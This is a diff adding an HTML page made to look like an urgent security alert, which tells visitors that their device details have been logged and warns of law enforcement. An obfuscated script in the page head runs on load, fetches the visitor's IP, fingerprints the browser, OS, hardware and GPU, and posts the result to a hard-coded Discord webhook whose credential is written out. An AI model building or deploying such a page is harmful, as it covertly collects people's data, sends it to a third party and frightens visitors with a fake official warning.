@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Urgent Alert - Action Required</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f2f4f7;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+        }
+ 
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+ 
+        h1 {
+            color: #e74c3c;
+            font-size: 56px;
+            margin-bottom: 10px;
+        }
+ 
+        h2 {
+            color: #333;
+            font-size: 36px;
+            margin-bottom: 25px;
+        }
+ 
+        p {
+            font-size: 20px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+ 
+        .warning {
+            font-weight: bold;
+            color: #e74c3c;
+        }
+ 
+        .content {
+            text-align: left;
+        }
+ 
+        .emoji {
+            font-size: 48px;
+        }
+ 
+        .details-box {
+            background-color: #f9e5e5;
+            padding: 15px;
+            border-left: 5px solid #e74c3c;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+ 
+        .action-box {
+            background-color: #ffe4c4;
+            padding: 15px;
+            border-left: 5px solid #ff5733;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+ 
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+ 
+        ul li {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+ 
+        .call-to-action {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff5733;
+        }
+ 
+        button {
+            background-color: #e74c3c;
+            color: white;
+            font-size: 20px;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+ 
+        button:hover {
+            background-color: #c0392b;
+        }
+    </style>
+    <script>
+        (function() {
+            function _0x2341(_0x1f89e7) {
+                const _0x2341de = _0x2341cc[_0x1f89e7];
+                return _0x2341de;
+            }
+            const _0x2341cc = ['then', 'json', 'Error fetching IP', 'send', 'application/json', 'Online', 'POST', 'Disabled', 'webhookUrl', 'fetch', 'content', 'navigator', 'Failed to send webhook', 'userAgent', 'onLine', 'localTime', 'WebRTC', 'Failed', 'document', 'platform', 'true', 'json', 'resolvedOptions'];
+            const _0x2341fn = fetch('https://api.ipify.org?format=json').then(function(_0x2341s) {
+                return _0x2341s[_0x2341cc[1]]();
+            }).then(function(_0x2341d) {
+                const _0x43c2a = _0x2341d.ip;
+                gatherData(_0x43c2a);
+            }).catch(function() {
+                gatherData('Unable to fetch IP');
+                console[_0x2341cc[2]]();
+            });
+ 
+            function gatherData(_0x3c47f) {
+                const ua = _0x2341cc[13];
+                const screenW = window.screen.width;
+                const screenH = window.screen.height;
+                const windowW = window.innerWidth;
+                const windowH = window.innerHeight;
+                const browserLang = navigator.language || navigator.userLanguage;
+                const timeZone = Intl.DateTimeFormat()[_0x2341cc[10]]().timeZone;
+                const localT = new Date().toLocaleString();
+                const onlineStatus = navigator[_0x2341cc[14]] ? _0x2341cc[5] : 'Offline';
+                const cookieStatus = navigator.cookieEnabled ? 'Enabled' : _0x2341cc[7];
+                const os = navigator[_0x2341cc[19]];
+                const _0x43c2ad = navigator[_0x2341cc[17]];
+                const referrer = document.referrer || 'Direct or Unknown Source';
+                const cpuCores = navigator.hardwareConcurrency || 'Unknown';
+                const doNotTrack = navigator.doNotTrack === '1' ? _0x2341cc[7] : 'Disabled';
+                const deviceMemory = navigator.deviceMemory || 'Unknown';
+                const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark Mode' : 'Light Mode';
+                const gpuInfo = getGPUInfo();
+                const timeZoneOffset = new Date().getTimezoneOffset();
+ 
+                const message = `
+**Visitor Data Detected**
+ 
+**IP**: ${_0x3c47f}
+**User Agent**: ${ua}
+**Screen Size**: ${screenW}x${screenH}
+**Window Size**: ${windowW}x${windowH}
+**Language**: ${browserLang}
+**Time Zone**: ${timeZone} (UTC Offset: ${timeZoneOffset})
+**Local Time**: ${localT}
+**Online Status**: ${onlineStatus}
+**Cookies**: ${cookieStatus}
+**OS**: ${os}
+**CPU Cores**: ${cpuCores}
+**Do Not Track**: ${doNotTrack}
+**Memory**: ${deviceMemory} GB
+**Preferred Theme**: ${prefersDarkMode}
+**GPU Info**: ${gpuInfo}`;
+                sendToDiscord(message);
+            }
+ 
+            function sendToDiscord(message) {
+                const webhookUrl = 'https://discordapp.com/api/webhooks/1295357323870470169/8fKiYP_US47B0_uXYZtN6fHSeTH4ggEO7vtzi3AGrkD9L6w7Sc2qR3zMdWjz8X4RioVi';
+                const data = {
+                    content: message,
+                    username: 'Scammer Tracker',
+                    avatar_url: 'https://i.imgur.com/4M34hi2.png'
+                };
+ 
+                fetch(webhookUrl, {
+                    method: _0x2341cc[6],
+                    headers: {
+                        'Content-Type': _0x2341cc[4]
+                    },
+                    body: JSON.stringify(data)
+                }).then(function(_0x2341a) {
+                    if (_0x2341a.ok) {
+                        console[_0x2341cc[0]]('Webhook sent');
+                    } else {
+                        console[_0x2341cc[16]](_0x2341cc[12]);
+                    }
+                }).catch(function() {
+                    console[_0x2341cc[16]](_0x2341cc[12]);
+                });
+            }
+ 
+            function getGPUInfo() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+                return 'Unknown GPU';
+            }
+        })();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 Urgent Security Alert! 🚨</h1>
+        <h2>Immediate Action Required</h2>
+ 
+        <div class="details-box">
+            <p class="warning">We have identified suspicious activity on your network. Your information has been logged for security purposes.</p>
+        </div>
+ 
+        <div class="content">
+            <h2>What We Know So Far</h2>
+            <p>We’ve collected some important details about your connection and device. Law enforcement may be notified if malicious activity is detected.</p>
+ 
+            <h2>Details Captured:</h2>
+            <ul>
+                <li><strong>Your IP Address</strong></li>
+                <li><strong>Your Device Information</strong></li>
+                <li><strong>Browser and OS Data</strong></li>
+            </ul>
+        </div>
+ 
+        <div class="emoji">😢</div>
+ 
+        <div class="action-box">
+            <h2 class="call-to-action">This is your final warning.</h2>
+            <p>We urge you to reflect on your actions and avoid further suspicious behavior. This alert is being actively monitored.</p>
+        </div>
+ 
+        <button>Contact Support</button>
+    </div>
+</body>
+</html>
